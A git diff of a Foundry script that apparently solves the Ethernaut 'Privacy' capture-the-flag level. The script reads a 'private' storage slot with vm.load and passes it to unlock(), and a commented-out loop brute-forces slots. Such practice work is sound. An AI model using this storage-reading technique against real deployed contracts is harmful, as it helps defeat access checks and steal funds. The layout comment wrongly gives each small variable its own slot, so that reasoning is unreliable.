@@ -7,14 +7,24 @@ import "forge-std/console.sol";
 
 contract PrivacySolution is Script {
 
-    Privacy public privacyInstance = Privacy(0xDC7B775cCA5162DA49D400D3aAff7f77bAbCF1aD);
+    Privacy public privacyInstance = Privacy(0xf2634a7d8Ee1ab74375d96Ee9228775989b08d3A);
 
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        bytes32 key = 0x8d07fb18a1848c8a4c8f2110b3b873d58f712f2b833bb3b7251a6ba6c93db4af;
-        console.log("Before: ", privacyInstance.locked());
-        privacyInstance.unlock(bytes16(key));
-        console.log("After: ", privacyInstance.locked());
+        
+        console.logBool(privacyInstance.locked());
+        // data[2] is at storage slot 5 (bool locked -> 0, uint256 ID ->1, uint8 flattening ->2, uint8 denomination ->3, uint16 awkwardness ->4, bytes32[3] data -> 5,6,7)
+        bytes32 data2; // slot of data[2]
+        data2 = vm.load(address(privacyInstance), bytes32(uint256(5))); // slot of data[2]
+        privacyInstance.unlock(bytes16(data2));
+        // for (uint256 i = 0; i < 8; i++) {
+        //     data2 = vm.load(address(privacyInstance), bytes32(uint256(i))); // slot of data[2]
+        //     privacyInstance.unlock(bytes16(data2));
+        //     // console.logBytes32(data2);
+        // }
+
+        console.logBool(privacyInstance.locked());
+
         vm.stopBroadcast();
     }
 }
